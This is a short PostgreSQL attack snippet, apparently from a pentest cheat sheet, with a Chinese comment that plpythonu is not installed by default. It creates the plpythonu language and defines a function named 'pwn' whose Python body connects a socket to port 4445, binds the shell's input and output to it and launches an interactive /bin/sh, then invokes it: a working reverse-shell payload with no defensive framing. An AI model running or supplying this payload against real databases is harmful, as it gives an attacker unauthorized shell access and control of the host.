-- plpythonu 默认没有安装

CREATE LANGUAGE plpythonu;
CREATE OR REPLACE FUNCTION pwn() RETURNS text LANGUAGE plpythonu AS $$
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
a=subprocess.Popen(["/bin/sh","-i"])
return ""
$$
;

select pwn();

